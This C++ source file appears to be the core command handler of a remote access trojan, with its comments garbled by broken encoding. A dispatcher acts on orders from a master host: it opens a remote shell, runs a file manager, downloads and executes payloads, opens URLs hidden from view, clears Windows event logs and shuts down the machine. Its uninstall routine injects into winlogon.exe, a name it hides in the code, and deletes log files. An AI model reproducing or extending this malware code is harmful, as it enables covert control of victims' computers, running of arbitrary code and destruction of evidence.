// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////


#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "inject.h"

HINSTANCE	CKernelManager::g_hInstance = NULL;
DWORD		CKernelManager::m_dwLastMsgTime = GetTickCount();
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// �������ӣ����ƶ˷��������ʼ����
	m_bIsActived = false;
	// ����һ�����Ӽ��̼�¼���߳�
	// ����HOOK��UNHOOK������ͬһ���߳���
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}
// ���ϼ���
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE: // �ļ�����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SHELL: // Զ��sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;

	case COMMAND_DOWN_EXEC: // ������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // ���ݲ�����
		break;
	case COMMAND_OPEN_URL_SHOW: // ��ʾ����ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // ���ش���ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // ж��,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // �����־
		CleanEvent();
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // �ı�ע
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // ���·����
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // �ظ�������
		break;
	}	
}
void CKernelManager::UnInstallService()
{
	char *lpServiceDllPath = NULL;
	lpServiceDllPath = (char *)FindConfigString(CKernelManager::g_hInstance, "PPPPPP");
	lpServiceDllPath = lpServiceDllPath + 6;
	char RealPath[MAX_PATH];
	ExpandEnvironmentStrings(lpServiceDllPath, RealPath, MAX_PATH);
	delete lpServiceDllPath;

	char	strRandomFile[MAX_PATH];
	SYSTEMTIME second;
	GetLocalTime(&second);
	wsprintf(strRandomFile, "%d%d%d%d%d%d.bak",second.wYear,second.wMonth,second.wDay,second.wHour,second.wMinute,second.wSecond);
	MoveFileA(RealPath, strRandomFile);
	MoveFileExA(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	// ɾ�����߼�¼�ļ�
	char	strRecordFile[MAX_PATH];
	GetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\userdata.log");
	DeleteFileA(strRecordFile);
	char strHide_1[] = {'w','i','n','l','o','g','o','n','.','e','x','e','\0'};
	if (m_dwServiceType != 0x120)  // owner��Զ��ɾ���������Լ�ֹͣ�Լ�ɾ��,Զ���߳�ɾ��
	{
		InjectRemoveService(strHide_1, m_strServiceName);
	}
	else // shared���̵ķ���,����ɾ���Լ�
	{
		RemoveService(m_strServiceName);
	}
	// ���в�����ɺ�֪ͨ���߳̿����˳�
	CreateEvent(NULL, true, false, m_strKillEvent);
}






bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}